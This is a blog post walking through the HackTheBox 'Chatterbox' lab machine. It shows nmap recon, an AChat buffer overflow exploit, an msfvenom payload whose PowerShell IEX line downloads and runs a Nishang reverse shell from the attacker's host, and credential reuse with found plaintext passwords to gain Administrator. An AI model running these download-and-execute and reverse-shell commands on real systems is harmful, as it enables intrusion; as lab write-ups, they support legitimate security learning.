<!doctype html>
<html lang="en-us">
  <head>
    <title>ChatterBox HTB - WriteUP // 0xl3mon💀</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.80.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ChatterBox HTB - WriteUP"/>
<meta name="twitter:description" content="Chatterbox Information Gathering Nmap Recon Results
we begin identifiyng the Os System in our targeted machine Nmap Recon Open Ports Well now we will identify the possible open ports on the server to have a clearer idea about what services run on it nmap -sS --min-rate 5000 -p- --open -n 10.129.40.4 -Pn -vvvv
as can see only have 2 open ports we will investigate what they are about.
Service and version detection nmap -sC -sV -p 9255-9256 10."/>

    <meta property="og:title" content="ChatterBox HTB - WriteUP" />
<meta property="og:description" content="Chatterbox Information Gathering Nmap Recon Results
we begin identifiyng the Os System in our targeted machine Nmap Recon Open Ports Well now we will identify the possible open ports on the server to have a clearer idea about what services run on it nmap -sS --min-rate 5000 -p- --open -n 10.129.40.4 -Pn -vvvv
as can see only have 2 open ports we will investigate what they are about.
Service and version detection nmap -sC -sV -p 9255-9256 10." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xl3mon.github.io/posts/htb/chatterbox/" />
<meta property="article:published_time" content="2022-03-27T15:31:22+02:00" />
<meta property="article:modified_time" content="2022-03-27T15:31:22+02:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="John Doe" /></a>
      <h1>0xl3mon💀</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/posts/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
      <div class="app-header-social">
        
          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>Linkedin</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">ChatterBox HTB - WriteUP</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Mar 27, 2022
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          3 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="chatterbox">Chatterbox</h1>
<h2 id="information-gathering">Information Gathering</h2>
<p><strong>Nmap Recon Results</strong></p>
<p>we begin identifiyng the Os System in our targeted machine
<img src="https://i.imgur.com/NVWI0dM.png" alt="ttl-recon Windows System" title="ttl"></p>
<p><strong>Nmap Recon Open Ports</strong>
Well now we will identify the possible open ports on the server to have a clearer idea about what services run on it
<code>nmap -sS --min-rate 5000 -p- --open -n 10.129.40.4 -Pn -vvvv</code></p>
<p><img src="https://i.imgur.com/2skvn7E.png" alt="Scan Open Ports" title="Recon Open ports"></p>
<p>as can see only have 2 open ports we will investigate what they are about.</p>
<p><strong>Service and version detection</strong>
<code>nmap -sC -sV -p 9255-9256 10.129.40.4  -n -oN targeted</code>
<img src="https://i.imgur.com/j4v1DIw.png" alt="Service Detection"></p>
<p>Okay, now I had a little something to go on. I hit the discovered services with a version scan to obtain more information:</p>
<p>A little bit of research told me that <a href="https://sourceforge.net/projects/achat/">https://sourceforge.net/projects/achat/</a> is a freeware solution for conducting instant messaging and file sharing across a LAN. A little bit more research told me that some versions of it are vulnerable to a remote buffer overflow attack.</p>
<p><strong>vulnerability identification</strong>
<code>searchsploit achat</code>
<img src="https://i.imgur.com/zz6zM66.png" alt="Identifiyng Achat Exploit"></p>
<p><strong>Exploit Db Link</strong></p>
<p><a href="https://www.exploit-db.com/exploits/36025">https://www.exploit-db.com/exploits/36025</a></p>
<p>we will modify our exploit code with in the following lines and change for the direccion and port to the server
<img src="https://i.imgur.com/kK5UfFj.png" alt="Change ip and Ports"></p>
<p>with the intention to gain access to the system we need create a  payload with msfvenom with the follow instruccion to execute  a powershell command to make a get request and execute that code in memory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -a x86 --platform Windows -p windows/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;powershell IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.14.35:80/shell.ps1&#39;)&#34;</span> -e x86/unicode_mixed -b <span style="color:#e6db74">&#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39;</span> BufferRegister<span style="color:#f92672">=</span>EAX -f py
</code></pre></div><p><img src="https://i.imgur.com/pEU4r41.jpg" alt="Instruction Payload"></p>
<p><strong>Exploit</strong>
<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-Powershell-Tcp.ps1</a></p>
<p>now we share the file &ldquo;Invoke-PowershellTcp.ps1&rdquo; from nishang repository so that the server finds the resource that we specify in our payload, and we can obtain the reverse connection. But before that, we will first modify our shell.ps1 script so that after the code has been loaded into memory on the server side, it executes the following instruction
<img src="https://i.imgur.com/RrFfl7p.png" alt="Instruction To execute"></p>
<p><img src="https://i.imgur.com/7CIEFbx.png" alt="Buffer OverFlow Exploit"></p>
<p>how as can see from the server side a GET request is sent to our http in python server and we obtain a reverse conection</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h4 id="method-i">Method I</h4>
<p><strong>System Enumeration</strong>
enumerating the system we note that we do not have privilege tokens that we could abuse.
<img src="https://i.imgur.com/UOQp1Ys.png" alt="Token Privileges"></p>
<p><strong>Active Connections</strong>
we list all active conections on the servers to obtain more information, In the event that we run out of options to gain privileges, we will investigate more about what we can find</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">704</span>
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">360</span>
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">792</span>
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">920</span>
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">452</span>
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">476</span>
  TCP    10.129.40.4:139        0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
  TCP    10.129.40.4:9255       0.0.0.0:0              LISTENING       <span style="color:#ae81ff">5380</span>
  TCP    10.129.40.4:9256       0.0.0.0:0              LISTENING       <span style="color:#ae81ff">5380</span>
  TCP    10.129.40.4:49158      10.10.14.35:443        ESTABLISHED     <span style="color:#ae81ff">460</span>

</code></pre></div><p>to list the system we will use the Powerup script, to identify possible ways of exploitation to gain privileges
<img src="https://i.imgur.com/c9V9mhW.png" alt="Alfred Credentials"></p>
<p><strong>Credentials</strong> :
Alfred :  Welcome1!</p>
<p>now we have a valid credentials so we could try to reuse that credential with other users</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(proving that we can start processes)</span>
Start-Process -FilePath <span style="color:#e6db74">&#34;powershell&#34;</span> -argumentlist <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).downloadstring(&#39;http://10.10.14.35/shell.ps1&#39;)&#34;</span>

<span style="color:#75715e">#(Save our Password)</span>
$Secpass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;Welcome1!&#39;</span> -AsPlainText -Force

<span style="color:#75715e">#(Generating Credentials object)</span>
$cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Administrator&#39;</span>,$Secpass<span style="color:#f92672">)</span>


</code></pre></div><p><img src="https://i.imgur.com/bcozF6H.png" alt="ReUse Credentials"></p>
<p>Token Privileges like Administrator user
<img src="https://i.imgur.com/3mvDHfT.png" alt="">
we can use common exploits like juicy potato.</p>
<h4 id="method-ii">Method II</h4>
<p><strong>Checking Acl Administrator</strong>
<code>Get-Acl | FL *</code>
<img src="https://i.imgur.com/WDRC8Vr.png" alt="Administrator ACL">
We can see that we have full permissions in the <strong>&ldquo;C:\Users\Administrator\Desktop&rdquo;</strong> directory, which means that we can take advantage of that to give ourselves the permissions to modify, execute or read files in said directory</p>
<p><code>icacls root.txt /T /grant alfred:F</code></p>
<p><img src="https://i.imgur.com/dgUEw9J.png" alt="Acl root.txt">
now we have full control of the file &ldquo;root.txt&rdquo; so we can read,modify or execute the file what ever our want</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
